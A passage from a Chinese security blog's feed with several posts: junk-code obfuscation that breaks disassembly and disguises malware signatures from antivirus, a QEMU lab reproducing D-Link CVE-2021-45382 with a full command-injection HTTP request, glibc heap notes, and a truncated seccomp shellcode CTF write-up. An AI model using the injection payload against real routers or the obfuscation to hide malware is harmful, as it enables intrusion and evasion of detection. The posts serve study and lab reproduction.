alt="img"></p><p>虽然报错了，但是依然能够正常反编译。</p><p>可能是由于</p><ol><li>代码不够复杂</li><li>需要更多的junkcode</li></ol><p><strong>去花：通过逻辑分析，把整块不执行的代码和跳转代码nop掉即可。</strong></p><h2 id="0x02-可执行花指令"><a href="#0x02-可执行花指令" class="headerlink" title="0x02 可执行花指令"></a>0x02 可执行花指令</h2><p>花指令在程序执行过程中会被执行，但执行这些代码没有任何意义，执行前后不改变任何寄存器的值，也不改变程序执行逻辑和结果，目的是加大静态分析的难度，或是混淆特征码，绕过特征检测。</p><h3 id="1-call-修改返回地址"><a href="#1-call-修改返回地址" class="headerlink" title="1.call + 修改返回地址"></a>1.call + 修改返回地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call label</span><br><span class="line">label:</span><br><span class="line">add [esp],<span class="number">5</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在call中修改返回地址，使call执行完后跳过label中的指令，达到执行但是相当于没执行的效果。</p><p>并且混淆了sp指针，让ida报栈不平衡的同时，识别到ret指令，会直接将函数一分为二。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;call label;&quot;</span></span><br><span class="line">        <span class="string">&quot;label:;&quot;</span></span><br><span class="line">        <span class="string">&quot;add [rsp],5;&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;im here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我尝试直接使用这个汇编，但是出现了报错，原因暂时不明。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Assembler messages:</span><br><span class="line">错误： ambiguous operand size <span class="keyword">for</span> `add<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure><p>所以我自己魔改了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;call label;&quot;</span></span><br><span class="line">        <span class="string">&quot;label:;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;add rax,7;&quot;</span></span><br><span class="line">        <span class="string">&quot;push rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;im here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点是长了2个字节，所以add部分改成了7，原理是一样的，只不过原来是直接在esp上add，现在改为将esp pop出来加了在push回去。</p><p>反编译效果：</p><p><img src="/2022/10/11/junkcode/1665459555247-14f6218e-2e8c-410c-916a-db43339cdfff.png" alt="img"></p><p><img src="/2022/10/11/junkcode/1665459568072-6e83b038-345e-44b2-b3ea-c6f5b8ccc8ea.png" alt="img"></p><p><img src="/2022/10/11/junkcode/1665459577600-88d7cd3b-79f0-4dc3-910e-e24d6509cf68.png" alt="img"></p><p>反汇编效果：</p><p><img src="/2022/10/11/junkcode/1665459605446-daf51c50-043f-46bd-a6d4-c9e8a136d6ae.png" alt="img"></p><p>真-硬生生拆成两个函数。</p><p>可以用于隐藏函数尾部部分代码时使用。</p><p><strong>去花：从call $+5到第一个retn这段全部nop掉即可</strong></p><h3 id="2-混淆特征码"><a href="#2-混淆特征码" class="headerlink" title="2.混淆特征码"></a>2.混淆特征码</h3><p>这种类别的花指令组合形式很多，用于混淆木马、病毒的特征码，躲避AV查杀，不一定会造成反汇编失败，但是会对反汇编分析造成干扰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov op1,op2     ----&gt;    push op2 / pop op1</span><br><span class="line">jmp label       ----&gt;    push label / ret</span><br><span class="line">call label      ----&gt;    push label_next_instruction / push label / ret</span><br><span class="line">push op         ----&gt;    sub esp,<span class="number">4</span> / mov [esp],op</span><br></pre></td></tr></table></figure><p>主要是通过更长的代码去替换更短的代码，从而达到混淆特征码的效果。</p><p>尝试了一下第2条：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;push label;&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;label:;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;im here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译时需要加入 -no-pie，因为在内联汇编中添加了.text段的地址（push label）。</p><p>反编译效果：</p><p><img src="/2022/10/11/junkcode/1665460331363-8a06b6f6-5a3a-4862-8774-c39cb9f6e16c.png" alt="img"></p><p>反汇编效果比想象的要好：</p><p><img src="/2022/10/11/junkcode/1665460438664-ff9d95ea-1769-4b76-af80-252782c484c6.png" alt="img"></p><p>直接把后面那段整没了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础花指令-amp-去花指令&quot;&gt;&lt;a href=&quot;#基础花指令-amp-去花指令&quot; class=&quot;headerlink&quot; title=&quot;基础花指令&amp;amp;去花指令&quot;&gt;&lt;/a&gt;基础花指令&amp;amp;去花指令&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文主要作为个人学</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="Reverse" scheme="http://blog.k0nashi.cn/tags/Reverse/"/>
    
    <category term="bypass" scheme="http://blog.k0nashi.cn/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>使用QEMU进行IOT固件的虚拟环境搭建</title>
    <link href="http://blog.k0nashi.cn/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://blog.k0nashi.cn/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-10-10T10:00:34.000Z</published>
    <updated>2022-10-10T10:12:31.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用QEMU进行IOT固件的虚拟环境搭建"><a href="#使用QEMU进行IOT固件的虚拟环境搭建" class="headerlink" title="使用QEMU进行IOT固件的虚拟环境搭建"></a>使用QEMU进行IOT固件的虚拟环境搭建</h1><p>最近在尝试进行固件环境模拟，如果直接购买实物太费钱了，就想了点办法搭建虚拟环境。</p><p>尝试了@foxcookie的《D-Link_DIR-830LA1命令执行漏洞(CVE-2021-45382)》中使用的FirmAE，发现在模拟其他路由器时失败率很高。据说使用QEMU手动搭建的成功率会比使用FirmAE等工具高得多，于是尝试用QEMU搭建了一个虚拟环境，重新复现了一下Dlink的CVE-2021-45382。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>ubuntu18.04</p><p>binwalk v2.1.1</p><p>路由器固件：DIR830LA1_FW100B07</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ qemu-system-mips --version</span><br><span class="line">QEMU emulator version 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.40)</span><br><span class="line">Copyright (c) 2003-2017 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure><h2 id="环境安装相关指令"><a href="#环境安装相关指令" class="headerlink" title="环境安装相关指令"></a>环境安装相关指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/devttys0/binwalk.git #安装binwalk</span><br><span class="line">sudo apt-get install qemu qemu-system qemu-user-static binfmt-support #安装qemu</span><br><span class="line">sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev #安装C/C++编译器、liblzma、liblzo 和 zlib 相关依赖库</span><br><span class="line">#安装sasquatch</span><br><span class="line">git clone https://github.com/devttys0/sasquatch.git</span><br><span class="line">cd sasquatch</span><br><span class="line">chmod +x build.sh</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><h2 id="下载固件"><a href="#下载固件" class="headerlink" title="下载固件"></a>下载固件</h2><p><a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-830L/REVA/DIR-830L_REVA_FIRMWARE_1.00.B07.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-830L/REVA/DIR-830L_REVA_FIRMWARE_1.00.B07.ZIP</a> </p><p>#直接丢给迅雷下载</p><p>此为D-Link DIR-830LA1路由器固件DIR830LA1_FW100B07下载链接，解压后可以看到bin文件</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665390475747-3cbeb76c-ef25-402b-a8c2-d726d53a3986.png" alt="img"></p><h2 id="binwalk提取文件系统"><a href="#binwalk提取文件系统" class="headerlink" title="binwalk提取文件系统"></a>binwalk提取文件系统</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DIR830LA1_FW100B07.bin</span><br></pre></td></tr></table></figure><p>然后binwalk会提取出bin中的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  CVE-2021-45382 D-Link ls</span><br><span class="line">DIR830LA1_FW100B07.bin  _DIR830LA1_FW100B07.bin.extracted</span><br></pre></td></tr></table></figure><p>进入_DIR830LA1_FW100B07.bin.extracted看一下文件，其中的squashfs-root便是文件系统</p><p>随便找一个文件file一下看看系统架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin file busybox </span><br><span class="line">busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size</span><br></pre></td></tr></table></figure><p>这决定了一会使用qemu的哪个架构。</p><p><strong>MIPS</strong>决定了一会用mips，<strong>MSB</strong>或<strong>LSB</strong>决定一会用<strong>mips</strong>还是<strong>mipsel</strong>，<strong>32-bit</strong>决定是用<strong>mips</strong>还是<strong>mips32</strong>。</p><p>这里是32-bit的MSB，所以选择使用qemu-system-mips。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>网络配置我基本上是小白，看着大佬怎么配我就怎么配。</p><p>大概意思是我们需要桥接一个网卡，用于qemu和本机通信。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunctl –t top0 –u root</span><br><span class="line">ifconfig top0 192.168.10.1/24</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>使用三条指令后，ifconfig里应该会出现</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665391913701-a7bd219d-65d5-4e0f-81d7-727dc186f89b.png" alt="img"></p><p>这样的一个新网口。现在就可以配置QEMU虚拟机了</p><h2 id="配置QEMU虚拟环境"><a href="#配置QEMU虚拟环境" class="headerlink" title="配置QEMU虚拟环境"></a>配置QEMU虚拟环境</h2><p>下载对应系统内核</p><p>我是直接在_DIR830LA1_FW100B07.bin.extracted文件夹下执行以下两个指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br><span class="line">curl https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br></pre></td></tr></table></figure><p>然后在这个路径下touch一个init.sh，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh </span><br><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=tap0 -nographic</span><br></pre></td></tr></table></figure><p>其中-nographic 代表不新起一个qemu窗口。</p><p>写好后直接sudo ./init.sh即可。</p><p>然后会跳出debian-mips的登陆界面，用户名和密码都是root</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665392450682-fa6b4b4c-1eee-4575-98fe-5a199e0ee22a.png" alt="img"></p><p>现在要把虚拟机和本机都配置到一个网段下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.10.2/24</span><br></pre></td></tr></table></figure><p>此时虚拟机和本机应该是可以互相ping通的</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665392536275-4adb4e3c-1ca0-4310-b185-f2b69bebca8c.png" alt="img"></p><p>回到本机，在_DIR830LA1_FW100B07.bin.extracted文件夹下执行</p><p>tar -czvf 1.tar squashfs-root/</p><p>将系统文件打包，然后用scp传输到虚拟机中</p><p>scp 1.tar <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#49;&#48;&#46;&#x32;">&#x72;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#49;&#48;&#46;&#x32;</a>:/root/</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665392682204-2e06659c-7eca-4ead-80ba-e1f1b090c4b9.png" alt="img"></p><p>转到虚拟机，可以看到1.tar已经在目录下</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665392698369-f97b2d5f-4eaf-433d-923d-daccf39de67d.png" alt="img"></p><p>解压</p><p>tar –zxvf 1.tar</p><p>然后将系统文件进行挂载</p><p>mount -o bind /dev ./squashfs-root/dev</p><p>mount -t proc /proc ./squashfs-root/proc/</p><p>然后就可以直接chroot进入路由器系统了</p><p>chroot ./squashfs-root/ sh</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665392792126-d1b5a528-2c35-4010-af08-4f78bcf00c12.png" alt="img"></p><h2 id="启动路由器服务"><a href="#启动路由器服务" class="headerlink" title="启动路由器服务"></a>启动路由器服务</h2><p>从这里开始每个路由器都不太一样了，一般的思路是去/etc/下找init相关文件，看哪个文件是启动文件。</p><p>这里我测试出Dlink的启动程序在/etc/init.d/rcS</p><p>使用ssh连接虚拟机</p><p>ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#48;&#46;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#48;&#46;&#50;</a></p><p>使用chroot进入路由器系统，然后直接运行etc/init.d/rcS</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393033751-4ca6870b-1e35-4b3d-ad73-fa16c8e9944d-166539585050023.png" alt="img"></p><p>执行后就会一直跳already enabled!</p><p>此时用主机访问192.168.10.2</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393081251-db7132a1-0f89-4470-bdf9-691c9d3bd9be-166539585219925.png" alt="img"></p><p>路由器虚拟环境搭建成功</p><h2 id="复现cve-2021-45382"><a href="#复现cve-2021-45382" class="headerlink" title="复现cve-2021-45382"></a>复现cve-2021-45382</h2><p>在这个网页一直下一步，全部使用默认设置，直到配置完成。</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393218697-8240af9d-6bd3-437c-9b29-d9d96e01b094-166539585397427.png" alt="img"></p><p>然后等它倒数完就会直接进入登陆后的界面。</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393249864-0207b13d-b11c-4ccd-a1be-98746a551b8c-166539585555329.png" alt="img"></p><p>对该页面进行抓包，直接用转发到repeater构造POC。</p><p>cve的具体原理在此就不过多赘述了，毕竟这只是一个环境搭建的记录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /ddns_check.ccp HTTP/1.1</span><br><span class="line">Host: 192.168.10.2</span><br><span class="line">Cookie: uid=AInkmYGrA6</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">If-Modified-Since: Tue, 26 Aug 2014 10:56:26 GMT</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 99</span><br><span class="line"></span><br><span class="line">ccp_act=doCheck&amp;ddnsHostName=;ls /&gt;/www/1.html;&amp;ddnsUsername=;ls /&gt;/www/1.html;&amp;ddnsPassword=123456</span><br></pre></td></tr></table></figure><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393428251-75c8352c-400b-41ea-bcea-6c52582bd4cb.png" alt="img"></p><p>然后直接访问1.html</p><p><img src="/2022/10/10/%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8CIOT%E5%9B%BA%E4%BB%B6%E7%9A%84%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1665393457137-28ca9102-b8c3-4dc8-bf05-5c681e353461.png" alt="img"></p><p>可以看到“ls /”已经被执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用QEMU进行IOT固件的虚拟环境搭建&quot;&gt;&lt;a href=&quot;#使用QEMU进行IOT固件的虚拟环境搭建&quot; class=&quot;headerlink&quot; title=&quot;使用QEMU进行IOT固件的虚拟环境搭建&quot;&gt;&lt;/a&gt;使用QEMU进行IOT固件的虚拟环境搭建&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="IoT" scheme="http://blog.k0nashi.cn/tags/IoT/"/>
    
    <category term="qemu" scheme="http://blog.k0nashi.cn/tags/qemu/"/>
    
    <category term="虚拟化" scheme="http://blog.k0nashi.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>pwn各版本数据结构笔记</title>
    <link href="http://blog.k0nashi.cn/2022/09/06/notes/"/>
    <id>http://blog.k0nashi.cn/2022/09/06/notes/</id>
    <published>2022-09-06T10:15:52.000Z</published>
    <updated>2023-04-03T06:52:22.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tcache各版本变化"><a href="#tcache各版本变化" class="headerlink" title="tcache各版本变化"></a>tcache各版本变化</h2><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><p>第一次出现tcache<br>可以随意double free</p><h3 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc-2.29"></a>glibc-2.29</h3><p>在每个free到tcache的chunk的bk位置加入tcache管理器的地址，用于doublefree检测。<br>——————————————————————————————————————————————————</p><h2 id="unlink各版本变化"><a href="#unlink各版本变化" class="headerlink" title="unlink各版本变化"></a>unlink各版本变化</h2><h3 id="glibc-2-27及以前"><a href="#glibc-2-27及以前" class="headerlink" title="glibc-2.27及以前"></a>glibc-2.27及以前</h3><p>将待unlink chunk称为p，它fd指针指向的chunk为FD，bk指针指向的为BK。<br>检测FD的bk是否为p，以及BK的fd是否为p，如果是则执行unlink。<br>源码：<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;                                                               </span><br><span class="line">BK = P-&gt;bk;                                                               </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure><h3 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h3><p>添加了待p的size与相邻高地址chunk的prevsize是否相等的检查<br>源码更新log：<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">+ malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h2 id="doublefree各版本变化"><a href="#doublefree各版本变化" class="headerlink" title="doublefree各版本变化"></a>doublefree各版本变化</h2><h3 id="glibc-2-29-1"><a href="#glibc-2-29-1" class="headerlink" title="glibc-2.29"></a>glibc-2.29</h3><p>在tcache的chunk的bk位置加入key，防止进入tcache的chunk double free。</p><h2 id="unsorted-bin大小范围"><a href="#unsorted-bin大小范围" class="headerlink" title="unsorted bin大小范围"></a>unsorted bin大小范围</h2><p>chunk 用户空间&gt;=0x80 即至少malloc(0x80)</p><h2 id="tcache大小范围"><a href="#tcache大小范围" class="headerlink" title="tcache大小范围"></a>tcache大小范围</h2><p>chunk 用户空间&gt;= 0x420 即malloc(0x420)<br>另外calloc可以直接绕过tcache</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;tcache各版本变化&quot;&gt;&lt;a href=&quot;#tcache各版本变化&quot; class=&quot;headerlink&quot; title=&quot;tcache各版本变化&quot;&gt;&lt;/a&gt;tcache各版本变化&lt;/h2&gt;&lt;h3 id=&quot;glibc-2-27&quot;&gt;&lt;a href=&quot;#glibc-2</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>babyshellcode</title>
    <link href="http://blog.k0nashi.cn/2021/10/26/babyshellcode/"/>
    <id>http://blog.k0nashi.cn/2021/10/26/babyshellcode/</id>
    <published>2021-10-26T01:19:33.000Z</published>
    <updated>2023-04-03T06:53:50.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h1><p><img src="/2021/10/26/babyshellcode/image-20211015170648815.png" alt="image-20211015170648815"></p><p>拉进ida，看到Seccomp，应该是个沙盒题。</p><p><img src="/2021/10/26/babyshellcode/image-20211015170751830.png" alt="image-20211015170751830"></p><p>orw只给了or，不过没关系可以用比较检测eof的方法爆破。</p><p>shellcode1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and rdx,rsi</span><br><span class="line">shl rsi</span><br><span class="line">xor esi,esi</span><br><span class="line">mov rsi,0x10017</span><br><span class="line">xor rdi,rdi</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>由于有读入字符限制，先调用一个sys_read使可以读取更多字符</p><p>shellcode2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 